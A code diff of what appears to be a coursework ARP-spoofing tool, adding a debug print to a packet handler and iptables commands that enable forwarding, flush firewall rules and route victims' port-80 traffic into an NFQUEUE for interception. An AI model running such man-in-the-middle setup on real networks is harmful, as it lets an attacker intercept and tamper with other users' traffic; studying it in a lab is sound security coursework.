@@ -333,6 +333,7 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
+    cout << "Packet received" << endl;
     char *packet;
     int id = 0;
     struct nfqnl_msg_packet_hdr *ph;
@@ -458,9 +459,18 @@ int main()
 {
     system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
     system("iptables -F");
-    system("iptables -F -t nat");
-    // ...
+    system("iptables -t nat -F");
+    // 允许所有本地生成的数据包通过
+    // system("iptables -A OUTPUT -j ACCEPT");
+    // 重定向来自本地的 HTTP 请求到 nfqueue
+    // system("iptables -A OUTPUT -p tcp --dport 80 -j NFQUEUE --queue-num 0");
+    // 允许所有本地接收的数据包通过
+    // system("iptables -A INPUT -j ACCEPT");
+    // 重定向来自外部的 HTTP 响应到 nfqueue
+    // system("iptables -A INPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0");
 
+    system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
+    
     // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
     list_devices();
 
